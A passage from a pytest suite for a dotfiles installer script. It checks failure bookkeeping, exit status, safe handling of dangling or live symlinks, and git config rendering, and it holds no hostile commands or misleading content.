                id="apt-get-update-in-wezterm",
            ),
            pytest.param(
                {
                    "curl": "",
                    "sudo": _DRAIN_TEE + _fails_on(_APT_UPDATE),
                    "dpkg": "echo amd64",
                },
                _absent("gh") + "OS=ubuntu install_gh",
                "apt-get update failed",
                id="apt-get-update-in-gh",
            ),
            pytest.param(
                {},
                _absent("gh") + "OS=linux install_gh",
                "No gh install path",
                id="gh-has-no-install-path-on-this-os",
            ),
            pytest.param(
                {},
                _absent("glow", "go") + "OS=ubuntu install_glow",
                "go not found; skipping glow",
                id="glow-needs-go",
            ),
            pytest.param(
                {},
                _absent("pip3", "pip") + "install_mcp_server_deps",
                "pip not found; skipping MCP server deps",
                id="pip-not-found",
            ),
            pytest.param(
                {},
                _absent("claude") + "register_claude_mcp_servers",
                "claude CLI not found",
                id="claude-not-found",
            ),
            pytest.param(
                {},
                'vim() { return 127; }; command_exists() { [ "$1" = "vim" ] && '
                'return 1 || command -v "$1" >/dev/null 2>&1; }; '
                "install_vim_plugins",
                "vim not found; skipping Vim plugin installation",
                id="vim-not-found",
            ),
            pytest.param(
                {},
                "install_ai_tools </dev/null",
                "Non-interactive shell detected",
                id="ai-tools-need-a-tty",
            ),
            pytest.param(
                {},
                "OS=windows install_os_packages",
                "Windows detected",
                id="windows-packages-are-manual",
            ),
            pytest.param(
                {},
                "OS=linux install_os_packages",
                "Non-Debian Linux detected",
                id="non-debian-linux-packages-are-manual",
            ),
            pytest.param(
                {},
                "link_oh_my_zsh_theme",
                "Skipping the Oh My Zsh theme link",
                id="theme-link-without-oh-my-zsh",
            ),
            pytest.param(
                {},
                _absent("node", "npm") + "OS=windows install_nodejs",
                "npm not found; skipping npm global directory setup",
                id="npm-not-found",
            ),
        ],
    )
    def test_skips_and_deferred_outcomes_record_nothing(
        self, shell_env, stubs, snippet, warning
    ):
        for name, body in stubs.items():
            shell_env.stub(name, body=body)
        res, failures = run_recording(snippet, shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert warning in res.stdout, res.stdout
        assert failures == [], res.stdout + res.stderr

    @pytest.mark.parametrize(
        ("snippet", "login_shell", "message"),
        [
            (_absent("zsh") + "change_shell", "/bin/bash", "zsh not found"),
            (_absent("chsh") + "change_shell", "/bin/bash", "chsh command not found"),
            ("change_shell", "/bin/zsh", "already zsh"),
        ],
    )
    def test_change_shell_skips_record_nothing(
        self, shell_env, snippet, login_shell, message
    ):
        shell_env.stub("zsh")
        env = {**shell_env.env, "SHELL": login_shell}
        res, failures = run_recording(snippet, env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert message in res.stdout, res.stdout
        assert failures == []

    def test_a_tree_sitter_that_still_shadows_the_install_records_nothing(
        self, shell_env
    ):
        # brew succeeds but an unrunnable shim stays first on PATH: a
        # derivative of an install that itself worked.
        shell_env.stub("tree-sitter", body="exit 1", exit_code=1)
        res, failures = run_recording("OS=macos install_tree_sitter_cli", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "is still not >=" in res.stdout
        assert failures == []

    def test_tree_sitter_on_ubuntu_without_cargo_records_nothing(self, shell_env):
        shell_env.hide("cargo")
        res, failures = run_recording(
            _TS_ABSENT + "OS=ubuntu install_tree_sitter_cli", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "cargo not found" in res.stdout
        assert failures == []

    def test_create_symlinks_backup_warnings_record_nothing(self, shell_env):
        (shell_env.home / ".zshrc").write_text("# a real file\n", encoding="utf-8")
        res, failures = run_recording("create_symlinks </dev/null", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Backing up existing .zshrc" in res.stdout, res.stdout
        assert failures == []


class TestInstallFailureBookkeepingInTheSource:
    """record_failure appends to a shell array, and a subshell's copy of that
    array is thrown away: `x=$(try_install ...)`, a pipeline stage and a `&` job
    all lose the entry without any error. Nothing at runtime can notice that, so
    the source is checked for the shapes that cause it.

    Limits, stated rather than papered over: a helper that itself calls
    try_install and is then invoked inside `$(...)` is invisible to a text
    check. The runtime tests in TestInstallFailureRecording cover the real call
    sites.
    """

    _NAMES = r"(?:try_install|pip_install_user|record_failure)"
    # Anything that puts the call in a subshell.
    _IN_SUBSHELL = [
        # inside $(...) or `...`
        re.compile(r"(?:\$\(|`)[^)`\n]*\b" + _NAMES + r"\b"),
        # the receiving end of a single pipe, even across a line break
        re.compile(r"(?<!\|)\|(?!\|)&?\s*\b" + _NAMES + r"\b"),
        # the feeding end of a single pipe, on the same logical line
        re.compile(r"\b" + _NAMES + r"\b[^;&|}\n]*\|(?!\|)"),
        # a background job (`&&`, `&>` and `>&` are not)
        re.compile(r"\b" + _NAMES + r"\b[^;&|}\n]*(?<![<>])&(?![&>])"),
    ]

    @classmethod
    def _violations(cls, text: str) -> list[str]:
        # Join `\` continuations so a wrapped call is one logical line, and
        # drop comment-only lines (the prose above names the helpers freely).
        text = re.sub(r"\\\n[ \t]*", " ", text)
        text = "\n".join(
            line for line in text.splitlines() if not line.lstrip().startswith("#")
        )
        found = []
        for pattern in cls._IN_SUBSHELL:
            found.extend(m.group(0).strip() for m in pattern.finditer(text))
        return found

    @pytest.mark.parametrize(
        "bad",
        [
            "x=$(try_install widget brew install widget)",
            'out="$(echo hi; record_failure widget)"',
            "`pip_install_user pip3 widget`",
            "echo oops | record_failure widget",
            "echo oops |\n  record_failure widget",
            "try_install widget brew install widget | tee log",
            "try_install widget brew install widget &",
            "pip_install_user pip3 widget &",
        ],
    )
    def test_the_guard_flags_a_call_in_a_subshell(self, bad):
        assert self._violations(bad + "\n"), bad

    @pytest.mark.parametrize(
        "good",
        [
            "try_install widget brew install widget",
            'try_install "$tool" brew install "$tool" || true',
            "try_install widget brew install widget && echo ok",
            "try_install widget brew install widget &>/dev/null",
            "try_install widget sudo tee 2>&1",
            "fetch_and_run x sh || { record_failure x; print_warning y; }",
            "curl -fsSL u | sudo tee f || record_failure x",
            "curl -fsSL u | sudo dd of=f; record_failure x",
            "# x=$(try_install widget brew install widget) in a comment",
            "record_failure() {",
        ],
    )
    def test_the_guard_accepts_the_shapes_install_sh_uses(self, good):
        assert self._violations(good + "\n") == [], good

    def test_no_call_runs_in_a_subshell(self):
        text = INSTALL.read_text(encoding="utf-8")
        assert self._violations(text) == [], (
            "record_failure / try_install / pip_install_user run in a subshell "
            "here, so the entry they append is lost"
        )

    def test_the_list_is_declared_at_the_top_level(self):
        # Indented would mean inside a function, where it is not global when
        # install.sh is sourced.
        text = INSTALL.read_text(encoding="utf-8")
        assert re.search(r"^INSTALL_FAILURES=\(\)$", text, re.M)
        assert not re.search(
            r"\b(?:local|declare|typeset)\s+(?:-\S+\s+)*INSTALL_FAILURES\b", text
        )

    def test_main_resets_the_list_before_doing_anything(self):
        text = INSTALL.read_text(encoding="utf-8")
        body = text[text.index("\nmain() {") :]
        assert "\n  INSTALL_FAILURES=()\n" in body
        reset = body.index("\n  INSTALL_FAILURES=()\n")
        assert reset < body.index("\n  create_symlinks\n")


# Every step main() calls between create_symlinks and the closing message. The
# real ones install packages, so a test that runs main() replaces each with a
# marker echo. test_every_step_main_calls_is_stubbed keeps this list honest: a
# step added to main() and missing here would otherwise run for real.
_MAIN_STEPS = (
    "create_symlinks",
    "install_os_packages",
    "install_wezterm",
    "install_fonts",
    "install_nodejs",
    "install_gh",
    "install_pyenv",
    "install_uv",
    "install_glow",
    "install_docker",
    "install_hadolint",
    "install_lazydocker",
    "install_tree_sitter_cli",
    "install_mcp_server_deps",
    "install_linters_formatters",
    "install_oh_my_zsh",
    "install_vim_plug",
    "install_tmux_plugins",
    "install_vim_plugins",
    "setup_neovim",
    "install_ai_tools",  # reads from a TTY: must never run for real in a test
    "register_claude_mcp_servers",
    "_link_sandbox_cli",  # after the package steps; see TestSandboxCliWrapper
    "link_oh_my_zsh_theme",
    "change_shell",
)
_STUB_MAIN_STEPS = "detect_os() { OS=ubuntu; }; " + "".join(
    f"{step}() {{ echo STEP_{step}; }}; " for step in _MAIN_STEPS
)


class TestMainExitStatus:
    """main() ends in a failure summary and exit status 1 when any step
    recorded a failure, instead of an unconditional "Installation completed!".

    main runs as a plain command, last in the snippet: under `set -e`, `if main`
    would disable errexit inside it and `main; echo $?` would never reach the
    echo, so the process exit status is the observable.
    """

    def test_every_step_main_calls_is_stubbed(self):
        text = INSTALL.read_text(encoding="utf-8")
        body = text[text.index("\nmain() {") :]
        called = set(re.findall(r"^ {2,4}([a-z_]+)$", body, re.M))
        # Builtins and shell keywords that happen to stand alone on a line.
        called -= {"echo", "shift", "break", "do", "done", "else", "esac", "fi"}
        called -= {"report_install_failures"}
        assert called <= set(_MAIN_STEPS) | {"detect_os"}, (
            "main() calls steps this test would run for real: "
            f"{sorted(called - set(_MAIN_STEPS) - {'detect_os'})}"
        )

    def test_a_clean_run_still_ends_in_success(self, shell_env):
        res = run_sourced(_STUB_MAIN_STEPS + "main", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Installation completed!" in res.stdout
        assert "failed step" not in res.stdout
        assert "Next steps:" in res.stdout
        for step in _MAIN_STEPS:
            assert f"STEP_{step}" in res.stdout, step

    def test_recorded_failures_are_listed_and_the_exit_status_is_1(self, shell_env):
        res = run_sourced(
            _STUB_MAIN_STEPS + "install_uv() { record_failure alpha; }; "
            "install_docker() { record_failure beta; }; main",
            shell_env.env,
        )
        out = res.stdout
        assert res.returncode == 1, out + res.stderr
        assert "Installation finished with 2 failed step(s):" in out
        assert out.index("  - alpha\n") < out.index("  - beta\n")
        assert "Reasons are printed above as [WARNING]" in out
        assert "Installation completed!" not in out
        # Failed steps never stop the steps after them...
        assert "STEP_change_shell" in out
        # ...and the closing guidance is still printed after the summary.
        assert out.index("Installation finished with") < out.index("Next steps:")

    def test_a_real_try_install_failure_reaches_the_summary(self, shell_env):
        shell_env.stub("faketool", body='echo "E: nope" >&2\nexit 1')
        res = run_sourced(
            _STUB_MAIN_STEPS
            + "install_uv() { try_install widget faketool install widget; }; main",
            shell_env.env,
        )
        assert res.returncode == 1, res.stdout + res.stderr
        assert "Failed to install widget" in res.stdout
        assert "Installation finished with 1 failed step(s):" in res.stdout
        assert "  - widget\n" in res.stdout

    def test_each_run_starts_from_an_empty_list(self, shell_env):
        res = run_sourced(
            _STUB_MAIN_STEPS + "INSTALL_FAILURES=(stale); main", shell_env.env
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Installation completed!" in res.stdout
        assert "stale" not in res.stdout

    def test_dry_run_still_exits_zero(self, shell_env):
        res = run_sourced(_STUB_MAIN_STEPS + "main --dry-run", shell_env.env)
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Dry-run complete" in res.stdout
        assert "failed step" not in res.stdout

    def test_dry_run_never_turns_a_recorded_failure_into_exit_1(self, shell_env):
        # The preview installs nothing, so there is no install result to judge.
        res = run_sourced(
            _STUB_MAIN_STEPS
            + "link_oh_my_zsh_theme() { record_failure alpha; }; main --dry-run",
            shell_env.env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "Dry-run complete" in res.stdout
        assert "failed step" not in res.stdout

    def test_help_documents_the_exit_status(self, shell_env):
        res = run_sourced("main --help", shell_env.env)
        assert res.returncode == 0, res.stderr
        out = res.stdout
        assert "Exit status:" in out
        assert re.search(r"^\s+0\s+\S", out, re.M)
        assert re.search(r"^\s+1\s+.*install steps? failed", out, re.M)
        assert re.search(r"^\s+2\s+usage error", out, re.M)


class TestLinkingThroughASymlinkedParent:
    """A parent that already resolves INTO the checkout must never be written through.

    `ln -s ~/dotfiles/.claude ~/.claude` is a common pre-existing layout.
    `mkdir -p` no-ops on that symlink, so every dest resolves back onto its own
    src: backup_if_real would see a real entry and MOVE the repo's own file
    into the backup dir, and `ln -sf` would leave a self-referential link in
    the working tree -- while printing [SUCCESS]. _link_codex_config would go
    further and write the rendered hooks.json and a seeded config.toml
    straight into the checkout.

    Driven against a COPY of the checkout: a regression here would otherwise
    relocate the real repository's files.
    """

    @staticmethod
    def _scratch_checkout(tmp_path):
        checkout = tmp_path / "checkout"
        checkout.mkdir()
        shutil.copy2(INSTALL, checkout / "install.sh")
        for rel in (".claude", ".codex", ".gemini", ".config/Code"):
            shutil.copytree(
                REPO_ROOT / rel,
                checkout / rel,
                symlinks=True,
                ignore=shutil.ignore_patterns("__pycache__", ".system"),
            )
        # The nvim tree is large and irrelevant here; an empty dir is enough
        # for link_entry to have a source.
        (checkout / ".config/nvim").mkdir()
        return checkout

    @staticmethod
    def _shape(root):
        return {
            str(p.relative_to(root)): (p.is_symlink(), p.is_file(), p.is_dir())
            for p in root.rglob("*")
        }

    # `.config` covers the git identity render: with ~/.config resolving into
    # the checkout, os.gitconfig and the user's real name/email would be
    # written into the working tree as untracked files.
    @pytest.mark.parametrize("rel", [".claude", ".codex", ".gemini", ".config"])
    def test_a_config_dir_already_linked_into_the_checkout_is_left_alone(
        self, shell_env, tmp_path, rel
    ):
        checkout = self._scratch_checkout(tmp_path)
        (shell_env.home / rel).symlink_to(checkout / rel)
        before = self._shape(checkout / rel)
        modes = {
            p: stat.S_IMODE(p.lstat().st_mode)
            for p in [checkout / rel, *(checkout / rel).rglob("*")]
        }

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert self._shape(checkout / rel) == before, "the checkout was modified"
        assert {p: stat.S_IMODE(p.lstat().st_mode) for p in modes} == modes, (
            "a file mode in the checkout was changed"
        )
        assert not list(shell_env.home.glob(f".dotfiles_backup_*/{rel}")), (
            "the repository's own files were moved into the backup dir"
        )
        assert "resolves into the checkout" in res.stdout + res.stderr
        if rel == ".gemini":
            # GEMINI.md's link_entry prints "resolves into the checkout" too, so
            # pin the settings.json guard by its own wording.
            assert "Skipping settings.json" in res.stdout + res.stderr

    def test_old_gemini_backups_are_restricted_even_when_gemini_is_in_the_checkout(
        self, shell_env, tmp_path
    ):
        # The backups live under $HOME, independent of where ~/.gemini points.
        checkout = self._scratch_checkout(tmp_path)
        (shell_env.home / ".gemini").symlink_to(checkout / ".gemini")
        stale = (
            shell_env.home / ".dotfiles_backup_20200101_000000/.gemini/settings.json"
        )
        stale.parent.mkdir(parents=True)
        stale.write_text("{}\n", encoding="utf-8")
        stale.chmod(0o644)

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert stat.S_IMODE(stale.stat().st_mode) == 0o600

    # The -ef guard must cover the dry-run branch of _render_git_local_config
    # too, or the preview promises to render os.gitconfig / user.gitconfig that
    # the real run then skips. Asserted on the git-specific wording: nvim's
    # link_entry also prints "resolves into the checkout" here, which would
    # pass without the guard.
    def test_dry_run_previews_the_same_git_config_skip(self, shell_env, tmp_path):
        checkout = self._scratch_checkout(tmp_path)
        (shell_env.home / ".config").symlink_to(checkout / ".config")
        before = self._shape(checkout / ".config")

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env={**shell_env.env, "DRY_RUN": "1"},
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert self._shape(checkout / ".config") == before
        lines = res.stdout.splitlines()
        assert any(
            "[DRY-RUN]" in ln and "Skipping git config render" in ln for ln in lines
        ), res.stdout
        assert not [ln for ln in lines if ".config/git/" in ln], res.stdout

    # The guards must compare identity, not `pwd -P` strings. bash resolves
    # symlinks textually and never canonicalises case, so on a case-insensitive
    # filesystem (the macOS default) a link spelled `.../CHECKOUT/.claude` and
    # an installer run from `.../checkout` produce two different strings for
    # one directory, bypassing every guard above. Only meaningful where the FS
    # folds case; a case-sensitive FS cannot express the alias at all.
    @pytest.mark.parametrize("rel", [".claude", ".codex", ".gemini", ".config"])
    def test_a_case_differing_alias_of_the_checkout_is_still_detected(
        self, shell_env, tmp_path, rel
    ):
        checkout = self._scratch_checkout(tmp_path)
        alias = tmp_path / "CHECKOUT"
        if not alias.exists():
            pytest.skip("filesystem is case-sensitive")
        (shell_env.home / rel).symlink_to(alias / rel)
        before = self._shape(checkout / rel)

        res = subprocess.run(
            ["bash", "-c", f'source "{checkout / "install.sh"}"\ncreate_symlinks'],
            capture_output=True,
            text=True,
            env=shell_env.env,
            timeout=120,
        )

        assert res.returncode == 0, res.stderr
        assert self._shape(checkout / rel) == before, "the checkout was modified"
        assert "resolves into the checkout" in res.stdout + res.stderr


class TestDanglingParentSymlinks:
    """A stale symlink where a config directory belongs must be replaced, not fatal.

    `[ "$DRY_RUN" -eq 1 ] || mkdir -p "$HOME/.claude"` is an OR-list, so the
    mkdir IS the command `set -e` watches: on a dangling ~/.claude it would
    fail with a bare "No such file or directory" and the installer would die
    mid-run, before packages, MCP registration or chsh -- with no [ERROR] line.
    backup_if_real already treats a symlink, even a broken one, as ours to
    replace; the directory sites have to agree.
    """

    # `.config/git` is the git config render's own directory: behind a bare
    # `mkdir -p` right after the ensure_dir for its parent, a dangling
    # ~/.config/git would kill the run exactly the way the sites above would.
    @pytest.mark.parametrize(
        "rel",
        [
            ".claude",
            ".codex",
            ".gemini",
            ".tmux",
            ".config",
            ".config/Code/User",
            ".config/git",
        ],
    )
    def test_a_dangling_symlink_where_a_config_dir_belongs_is_replaced(
        self, shell_env, rel
    ):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / rel).parent.mkdir(parents=True, exist_ok=True)
        (home / rel).symlink_to("/nonexistent/gone")

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert (home / rel).is_dir() and not (home / rel).is_symlink()

    def test_a_dangling_themes_symlink_is_replaced_too(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh/custom").mkdir(parents=True)
        (home / ".oh-my-zsh/custom/themes").symlink_to("/nonexistent/gone")

        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert (home / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme").is_symlink()

    # The two package-install sites. They are not behind create_symlinks, so
    # nothing else has cleared the way: a bare `mkdir -p` on a dangling link
    # kills the run under `set -e` (and the AFTER_ marker never prints) with
    # no [ERROR] line and no failure summary.
    def test_a_dangling_npm_global_symlink_is_replaced(self, shell_env):
        home = shell_env.home
        shell_env.stub("node")
        shell_env.stub("npm")
        (home / ".npm-global").symlink_to("/nonexistent/gone")

        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_NODEJS" in res.stdout
        assert (home / ".npm-global").is_dir()
        assert not (home / ".npm-global").is_symlink()
        assert f"npm config set prefix {home}/.npm-global" in shell_env.calls

    def test_a_live_npm_global_symlink_is_the_users_redirect_and_is_kept(
        self, shell_env, tmp_path
    ):
        # ensure_dir's own rule: only a DANGLING link is replaced.
        home = shell_env.home
        shell_env.stub("node")
        shell_env.stub("npm")
        real = tmp_path / "bigger-disk" / "npm-global"
        real.mkdir(parents=True)
        (home / ".npm-global").symlink_to(real)

        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (home / ".npm-global").is_symlink()
        assert (home / ".npm-global").readlink() == real

    # `.local` is the parent: `mkdir -p ~/.local/bin` fails just the same when
    # the PARENT is the stale link, exactly as `.config` / `.config/git` above.
    @pytest.mark.parametrize("rel", [".local", ".local/bin"])
    def test_a_dangling_symlink_where_the_apt_alias_dir_belongs_is_replaced(
        self, shell_env, rel
    ):
        home = shell_env.home
        shell_env.stub("batcat")
        shell_env.stub("fdfind")
        (home / rel).parent.mkdir(parents=True, exist_ok=True)
        (home / rel).symlink_to("/nonexistent/gone")

        res = run_sourced('install_apt_packages; echo "AFTER_APT"', shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "AFTER_APT" in res.stdout
        assert (home / rel).is_dir() and not (home / rel).is_symlink()
        for name in ("bat", "fd"):
            assert (home / ".local/bin" / name).is_symlink(), f"no {name} alias"


class TestOsGitconfigWrite:
    """os.gitconfig's write must be checked, never assumed.

    It is rendered by `{ ... } >"$HOME/.config/git/os.gitconfig"` -- a
    redirect on a COMPOUND command -- and macOS /bin/bash 3.2 does not fire
    errexit when that redirect fails: the group is skipped and the next line
    would print "[SUCCESS] Rendered os.gitconfig" over a file that was never
    written, leaving git with no credential helper. Both failures below are
    built to behave the same on bash 3.2 and 5, so the tests do not depend on
    which one runs them.
    """

    # The file is generated and rewritten on every run -- no user content
    # lives in it -- so a symlink there, even a broken one, is ours to
    # replace (the backup_if_real policy), unlike the dangling ~/.zsh_secrets
    # and user.gitconfig redirects, which hold the user's own keys and
    # identity and are left alone. Replacing also means never writing THROUGH
    # the link: with the target's parent present, the redirect would otherwise
    # create a file at wherever the stale link points.
    @pytest.mark.parametrize("parent_exists", [False, True])
    def test_a_dangling_link_is_replaced_with_the_generated_file(
        self, shell_env, tmp_path, parent_exists
    ):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target_dir = tmp_path / "unmounted-volume"
        if parent_exists:
            target_dir.mkdir()
        target = target_dir / "os.gitconfig"
        rendered = home / ".config/git/os.gitconfig"
        rendered.symlink_to(target)

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert not rendered.is_symlink() and rendered.is_file()
        assert "helper = " in rendered.read_text(encoding="utf-8")
        assert not target.exists(), "the render was written through the stale link"
        assert "dangling symlink" in res.stdout

    def test_dry_run_previews_the_same_replacement(self, shell_env, tmp_path):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target = tmp_path / "unmounted-volume/os.gitconfig"
        rendered = home / ".config/git/os.gitconfig"
        rendered.symlink_to(target)

        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})

        assert res.returncode == 0, res.stdout + res.stderr
        assert any(
            "[DRY-RUN]" in ln and "dangling symlink" in ln and "os.gitconfig" in ln
            for ln in res.stdout.splitlines()
        ), res.stdout
        assert rendered.is_symlink() and rendered.readlink() == target

    # The case the dangling-only guard missed: a LIVE link. `[ -e ]` follows
    # the link, so it is true here, the replacement was skipped, and the
    # redirect wrote THROUGH the link -- overwriting whatever the link points
    # at, with no backup, wherever that happens to be (another dotfiles
    # checkout, a shared config, a file the user keeps by hand). The link is
    # ours to replace; its target is not ours to touch.
    @pytest.mark.parametrize("target_kind", ["file", "directory"])
    def test_a_live_link_is_replaced_and_its_target_is_left_alone(
        self, shell_env, tmp_path, target_kind
    ):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target = tmp_path / "elsewhere" / "os.gitconfig"
        target.parent.mkdir()
        if target_kind == "file":
            original = "[user]\n\tname = the-users-own-file\n"
            target.write_text(original, encoding="utf-8")
        else:
            target.mkdir()
            (target / "keep.txt").write_text("keep\n", encoding="utf-8")
        rendered = home / ".config/git/os.gitconfig"
        rendered.symlink_to(target)

        res = run_sourced("create_symlinks", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert not rendered.is_symlink() and rendered.is_file()
        assert "helper = " in rendered.read_text(encoding="utf-8")
        if target_kind == "file":
            assert target.read_text(encoding="utf-8") == original, (
                "the render was written through the live link"
            )
        else:
            assert [p.name for p in target.iterdir()] == ["keep.txt"]
        # Said out loud: a live link is not the stale-link case, and the user
        # should be told their link was replaced.
        assert any(
            "Replacing symlink" in ln and "os.gitconfig" in ln
            for ln in res.stdout.splitlines()
        ), res.stdout

    def test_dry_run_previews_replacing_a_live_link_and_changes_nothing(
        self, shell_env, tmp_path
    ):
        home = shell_env.home
        (home / ".config/git").mkdir(parents=True)
        target = tmp_path / "elsewhere" / "os.gitconfig"
        target.parent.mkdir()
        target.write_text("mine\n", encoding="utf-8")
        rendered = home / ".config/git/os.gitconfig"
        rendered.symlink_to(target)

        res = run_sourced("create_symlinks", {**shell_env.env, "DRY_RUN": "1"})

        assert res.returncode == 0, res.stdout + res.stderr
        # "would render" alone would also match the plain preview line; the
        # replacement must be announced as its own decision.
        assert any(
            "[DRY-RUN]" in ln
            and "would replace" in ln
            and "symlink" in ln
            and "os.gitconfig" in ln
            for ln in res.stdout.splitlines()
        ), res.stdout
        assert "dangling" not in res.stdout.lower()
        assert rendered.is_symlink() and rendered.readlink() == target
        assert target.read_text(encoding="utf-8") == "mine\n"

    # A directory where the file belongs: the redirect fails with EISDIR on
    # every bash, and a directory is not ours to delete. The failure is an
    # [ERROR] plus a recorded failure (main's summary and exit status carry it),
    # not an abort: under `set -e` a non-zero return here used to stop
    # create_symlinks half-way, leaving the editor / Claude / Codex / Gemini
    # links unmade and skipping the whole package phase -- the opposite of
    # main()'s "symlinks first" rationale.
    def test_a_failed_write_is_recorded_and_linking_continues(self, shell_env):
        home = shell_env.home
        blocker = home / ".config/git/os.gitconfig"
        blocker.mkdir(parents=True)

        res, failures = run_recording("create_symlinks", shell_env.env)

        out = res.stdout + res.stderr
        assert any(
            "[ERROR]" in ln and "os.gitconfig" in ln for ln in out.splitlines()
        ), out
        assert "Rendered os.gitconfig" not in out
        assert blocker.is_dir() and not any(blocker.iterdir())
        assert failures == ["git config (os.gitconfig)"]
        # The links that come after the git render still happen.
        assert (home / ".claude/settings.json").is_symlink(), out
        assert (home / ".gemini/GEMINI.md").is_symlink(), out

    # ~/.config/git unusable (here: a plain file in its place) made the bare
    # ensure_dir fail with only mkdir's own message and abort the run.
    def test_an_unusable_config_git_dir_is_recorded_and_linking_continues(
        self, shell_env
    ):
        home = shell_env.home
        (home / ".config").mkdir(parents=True)
        (home / ".config/git").write_text("not a directory\n", encoding="utf-8")

        res, failures = run_recording("create_symlinks", shell_env.env)

        out = res.stdout + res.stderr
        assert any(
            "[ERROR]" in ln and ".config/git" in ln for ln in out.splitlines()
        ), out
        assert failures == ["git config (os.gitconfig)"]
        assert (home / ".config/git").read_text(encoding="utf-8") == "not a directory\n"
        assert (home / ".claude/settings.json").is_symlink(), out

    # A read-only ~/.config/git is the usual reason the os.gitconfig write
    # fails; the identity file in the same directory then fails too, and its
    # writes were bare under `set -e`.
    @pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory modes")
    def test_a_read_only_config_git_dir_is_recorded_and_linking_continues(
        self, shell_env
    ):
        home = shell_env.home
        git_dir = home / ".config/git"
        git_dir.mkdir(parents=True)
        git_dir.chmod(0o555)
        try:
            res, failures = run_recording("create_symlinks", shell_env.env)
        finally:
            git_dir.chmod(0o755)

        out = res.stdout + res.stderr
        assert failures == [
            "git config (os.gitconfig)",
            "git config (user.gitconfig)",
        ], out
        assert (home / ".claude/settings.json").is_symlink(), out

    # ~/.config itself unusable: the git render records it, and the editor
    # links (nvim under ~/.config) must not abort the run one step later.
    def test_an_unusable_config_dir_is_recorded_and_linking_continues(self, shell_env):
        home = shell_env.home
        (home / ".config").write_text("not a directory\n", encoding="utf-8")

        res, failures = run_recording("create_symlinks", shell_env.env)

        out = res.stdout + res.stderr
        assert "git config (os.gitconfig)" in failures, out
        assert "editor configs" in failures, out
        assert (home / ".config").read_text(encoding="utf-8") == "not a directory\n"
        assert (home / ".claude/settings.json").is_symlink(), out


class TestBackupsAreAnnounced:
    def test_a_backup_made_after_create_symlinks_still_names_its_location(
        self, shell_env
    ):
        """create_symlinks reports the backup dir only for ITS OWN backups.

        With nothing else to back up it rmdirs the empty dir and says nothing;
        link_oh_my_zsh_theme (called later from main) then re-creates it for
        the user's hand-edited theme, and must still announce where the moved
        file went rather than printing only "Backing up existing ...".
        """
        home = shell_env.home
        themes = home / ".oh-my-zsh/custom/themes"
        themes.mkdir(parents=True)
        (themes / "px-rose-pine.zsh-theme").write_text(
            "hand-edited\n", encoding="utf-8"
        )

        res = run_sourced("create_symlinks && link_oh_my_zsh_theme", shell_env.env)

        assert res.returncode == 0, res.stderr
        backups = list(home.glob(".dotfiles_backup_*"))
        assert len(backups) == 1
        moved = backups[0] / ".oh-my-zsh/custom/themes/px-rose-pine.zsh-theme"
        assert moved.read_text(encoding="utf-8") == "hand-edited\n"
        assert str(backups[0]) in res.stdout + res.stderr, (
            "the backup location was never announced"
        )


class TestGitIdentityRendering:
    @pytest.mark.parametrize(
        "name", ['Taro "T" Yamada', "Taro #1", "Taro; Yamada", "Taro\\"]
    )
    def test_config_metacharacters_in_the_identity_round_trip(
        self, shell_env, tmp_path, name
    ):
        """The rendered [user] block must read back exactly as it was given.

        A raw printf would write the values unquoted: `#` and `;` start a
        comment (so `Taro #1` becomes `Taro`), a `"` is swallowed, and a
        trailing backslash CONTINUES the line -- the name absorbs the email
        line and user.email is left unset, so git refuses to commit.
        """
        prior = tmp_path / "prior-gitconfig"
        for key, value in (("user.name", name), ("user.email", "t@example.com")):
            subprocess.run(
                ["git", "config", "--file", str(prior), key, value], check=True
            )
        env = {**shell_env.env, "GIT_CONFIG_GLOBAL": str(prior)}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        rendered = shell_env.home / ".config/git/user.gitconfig"
        for key, expected in (("user.name", name), ("user.email", "t@example.com")):
            got = subprocess.run(
                ["git", "config", "--file", str(rendered), key],
                capture_output=True,
                text=True,
            )
            assert got.returncode == 0, f"{key} is unreadable: {rendered.read_text()}"
            assert got.stdout.rstrip("\n") == expected


def _git_config_all(path, key):
    """Every value git reads for `key`, in file order (empty resets included)."""
    res = subprocess.run(
        ["git", "config", "--file", str(path), "--get-all", key],
        capture_output=True,
        text=True,
    )
    if res.returncode != 0:
        return []
    return res.stdout.split("\n")[:-1]


class TestGithubCredentialHelper:
